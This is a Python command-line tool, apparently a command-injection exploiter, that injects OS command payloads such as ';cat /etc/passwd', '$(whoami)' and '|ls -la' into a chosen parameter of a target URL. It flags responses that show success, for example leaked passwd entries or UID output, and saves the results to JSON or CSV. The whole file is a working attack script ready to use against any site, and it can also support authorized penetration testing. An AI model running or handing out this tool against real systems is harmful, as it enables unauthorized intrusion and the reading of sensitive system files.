import argparse
import requests
import csv
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm

# list of different injection payloads for window and unix system
DEFAULT_PAYLOADS = [
    # unix based
    ";id", ";cat /etc/passwd", "&whoami", "|ls -la", "||ping -c 1 localhost",
    "||nslookup example.com", "`whoami`", "$(whoami)",
    #  windows based
    "& whoami", "| dir", "&& ping -n 1 localhost", "|| nslookup example.com"
]

# list of keywords in payloads that suggest blind injection attempts
BLIND_INDICATORS = ["ping", "nslookup", "sleep", "timeout"]

# see if these are reflected in http
REFLECTION_MARKERS = ["{payload}", "EVAL_MARKER"]

# function that converts data into a useable format for requests.get
def parse_post_data(data_str):
    return dict(item.split("=", 1) for item in data_str.split("&") if "=" in item)

# function that converts cli headers argument into a dictionary for requests
def parse_headers(header_list):
    headers = {}
    for h in header_list:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers

# function that creates the action of sending the payload through a get or post request
def test_injection(url, param, payload, method='GET', data=None, headers=None):
    req_headers = headers or {}
    if method.upper() == 'GET':
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        query = urlencode(qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', query, ''))
        resp = requests.get(test_url, headers=req_headers, timeout=10)
    else:
        post_data = data.copy() if data else {}
        post_data[param] = payload
        resp = requests.post(url, data=post_data, headers=req_headers, timeout=10)
    return resp

# primary function which uses various parameters and constants to create and export a payload, fetch the results and record it, parsing through the results and organizing it
def exploit_cmd_injection(url, vuln_param, payloads, method='GET', data=None, headers=None, json_file=None, csv_file=None):
    findings = []
    base_length = None
    base_status = None

    for p in tqdm(payloads, desc="Testing payloads"):
        try:
            resp = test_injection(url, vuln_param, p, method, data, headers)

            # set baseline
            if base_length is None:
                base_length = len(resp.text)
                base_status = resp.status_code

            result = {
                'payload': p,
                'status': resp.status_code,
                'length': len(resp.text),
                'reflected': p in resp.text,
                'evidence': '',
            }

            # context based evidence
            if "root:x:" in resp.text or "UID=" in resp.text or "Windows IP" in resp.text or "user:" in resp.text:
                result['evidence'] = resp.text[:200]
                print(f"|!!| {vuln_param} = {p} => Possible injection!")
            elif result['reflected']:
                print(f"|+| Payload reflected: {p}")
            elif resp.status_code != base_status or len(resp.text) != base_length:
                print(f"|!| Payload caused response change: {p} (Status: {resp.status_code}, Len: {len(resp.text)})")
            elif any(ind in p.lower() for ind in BLIND_INDICATORS):
                print(f"|-| Blind payload sent: {p} (monitor DNS/logs externally)")

            findings.append(result)
        except Exception as e:
            print(f"|x| Error with payload {p}: {e}")

    if json_file:
        with open(json_file, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"|+| JSON results saved to {json_file}")

    if csv_file:
        with open(csv_file, "w", newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['payload', 'status', 'length', 'reflected', 'evidence'])
            writer.writeheader()
            for row in findings:
                writer.writerow(row)
        print(f"|+| CSV results saved to {csv_file}")

    if not findings:
        print("|*| No evidence of successful injection.")

# allows user to add more payloads 
def load_wordlist(wordlist_file):
    with open(wordlist_file) as f:
        return [line.strip() for line in f if line.strip()]

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Advanced Command Injection Exploiter")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("param", help="Vulnerable parameter name")
    parser.add_argument("-w", "--wordlist", help="Custom payload list")
    parser.add_argument("--method", choices=['GET', 'POST'], default='GET', help="HTTP method (GET or POST)")
    parser.add_argument("--header", action='append', help="Custom header(s) (e.g. 'User-Agent: X')")
    parser.add_argument("--data", help="POST data string (e.g. 'user=foo&pass=bar')")
    parser.add_argument("--json", help="Save results to JSON file")
    parser.add_argument("--csv", help="Save results to CSV file")
    args = parser.parse_args()

    payloads = load_wordlist(args.wordlist) if args.wordlist else DEFAULT_PAYLOADS
    headers = parse_headers(args.header) if args.header else None
    post_data = parse_post_data(args.data) if args.data else None

    exploit_cmd_injection(
        url=args.url,
        vuln_param=args.param,
        payloads=payloads,
        method=args.method,
        data=post_data,
        headers=headers,
        json_file=args.json,
        csv_file=args.csv
    )

if __name__ == "__main__":
    cli()
